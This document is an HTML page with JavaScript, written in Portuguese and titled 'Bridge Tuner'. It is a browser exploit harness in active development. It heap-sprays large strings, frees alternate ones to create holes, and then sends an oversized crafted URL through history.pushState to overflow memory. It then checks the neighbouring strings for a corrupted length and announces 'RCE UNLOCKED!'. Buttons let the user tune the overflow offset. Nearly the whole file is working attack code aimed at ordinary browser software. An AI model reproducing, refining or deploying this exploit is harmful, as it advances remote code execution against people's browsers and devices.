<!DOCTYPE html>
<html>
<head>
    <title>Bridge Tuner (Ajuste do Pulo)</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        button { 
            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer; margin-top: 10px;
        }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; margin-top: 20px;}
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.6em; padding: 15px; border: 4px solid white; animation: blink 1s infinite; }
        @keyframes blink { 50% { border-color: red; } }
    </style>
</head>
<body>

    <h1>Bridge Tuner: Recuando a Ponte</h1>
    <p>8192 caiu dentro. Vamos recuar para acertar a borda.</p>

    <button onclick="startBridgeTuning(16)">1. Recuar 16 bytes (Ponte: 8176)</button>
    <button onclick="startBridgeTuning(24)">2. Recuar 24 bytes (Ponte: 8168)</button>
    <button onclick="startBridgeTuning(32)">3. Recuar 32 bytes (Ponte: 8160)</button>
    <button onclick="startBridgeTuning(40)">4. Recuar 40 bytes (Ponte: 8152)</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709520;     
        const BASE_BRIDGE = 8192;       // O valor que foi "longo demais"
        const ATTACK_SIZE = 1024 * 4;   

        // Vítima: 1MB TextDecoder (Consagrada)
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startBridgeTuning(reduction) {
            // Calcula o novo tamanho da ponte
            let currentBridge = BASE_BRIDGE - reduction;

            log(`--- TESTANDO PONTE: ${currentBridge} (8192 - ${reduction}) ---`);
            
            // 1. Limpeza
            victims = [];
            await forceGC();

            try {
                // 2. SPRAY
                let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                rawBuffer.fill(0x42); 
                let decoder = new TextDecoder("utf-8");
                let baseString = decoder.decode(rawBuffer);

                const SPRAY_COUNT = 80;
                log("Alocando vítimas...");
                for(let i=0; i<SPRAY_COUNT; i++) {
                    let s = i + "_" + baseString.substring((i+"_").length);
                    victims.push(s);
                }

                // 3. BURACOS
                for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
                await forceGC();

                // 4. EXPLOIT
                log("Disparando...");
                setTimeout(() => {
                    try {
                        // A: Base
                        let buffer = "A".repeat(BASE_OFFSET);
                        
                        // B: Ponte Ajustada
                        buffer += "\x01".repeat(currentBridge);
                        
                        // C: Ataque
                        buffer += "\x01".repeat(ATTACK_SIZE);
                        
                        history.pushState({}, "bridge_" + reduction, "/" + buffer);

                        checkVictims(PAYLOAD_SIZE, reduction);

                    } catch (e) {
                        log("Erro: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro Memória: " + e.message);
            }
        }

        function checkVictims(expectedLen, red) {
            let success = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO: Length mudou
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! Length Corrompido com -${red}!`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert("RCE UNLOCKED!");
                        success = true;
                        break;
                    }
                    
                    // SINAL: Dados mudaram
                    if (msg.charCodeAt(0) !== 66) {
                         log(`[Ainda em DADOS] Recuo -${red} ainda caiu dentro. Tente mais.`);
                         success = true; 
                         break;
                    }

                } catch(e) {}
            }
            if(!success) log("Nada atingido. Reinicie e tente o próximo botão.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 600));
        }
    </script>
</body>
</html>
